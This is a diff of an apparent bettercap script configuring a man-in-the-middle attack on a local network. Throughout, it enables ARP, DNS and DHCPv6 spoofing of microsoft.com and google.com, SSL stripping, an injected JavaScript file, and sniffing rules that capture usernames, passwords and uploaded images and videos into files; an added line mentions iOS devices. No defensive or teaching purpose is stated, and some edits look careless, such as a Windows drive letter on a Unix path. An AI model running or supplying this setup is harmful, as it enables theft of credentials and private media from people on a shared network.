@@ -2,27 +2,27 @@
 set dns.spoof.domains microsoft.com, google.com
 set dhcp6.spoof.domains microsoft.com, google.com
 
-# Set up HTTP server path to serve any content (including UI page)
-set http.server.path /usr/local/share/bettercap/ui
+# Set up HTTP server path to serve any content
+set http.server.path www
 http.server on
 
 # Enable SSL stripping to intercept HTTPS traffic
 set https.proxy.sslstrip true
 https.proxy on
 
-# Use custom JavaScript file to enhance capture functionality
-set http.proxy.script /usr/local/share/bettercap/ui/js/enhanced-capture.js
+# Set a custom JavaScript file to enhance capture functionality
+set http.proxy.script aio.js
 
 # Enable DNS and DHCPv6 spoofing to redirect traffic to us
 dhcp6.spoof on
 dns.spoof on
 
-# Enable network sniffing and capture specific patterns in HTTP traffic
+# Enable network sniffing and capture specific patterns in HTTP traffic (username, password, image uploads, video uploads)
 set net.sniff.regexp .*username=.*|.*password=.*|.*multipart/form-data.*|.*image.*|.*video.*
 
 # Set output files for storing captured data
-set net.sniff.output passwords.cap
-set net.sniff.output.txt /usr/local/share/bettercap/ui/captured-data/passwords.txt
+set net.sniff.output C:/usr/local/share/bettercap/captured_data.cap
+set net.sniff.output.txt C:/usr/local/share/bettercap/captured_data.txt
 
 # Enable ARP spoofing for MITM attack
 arp.spoof on
@@ -30,14 +30,8 @@ arp.spoof on
 # Enable traffic sniffing
 net.sniff on
 
-# Display captured data in the UI dynamically (serve the captured data via HTTP UI)
-set api.rest.address 127.0.0.1
-set api.rest.port 8081
-set http.server.address 127.0.0.1
-set api.rest.username user
-set api.rest.password pass
-api.rest on
-http.server on
+# Enable SSL stripping bypass (optional but useful if SSL pinning is not being done on iOS devices)
+https.proxy.sslstrip true
 
 # Custom prompt for IPv6 (optional)
 set $ {by}{fw}{cidr} {fb}> {env.iface.ipv6} {reset} {bold}» {reset}
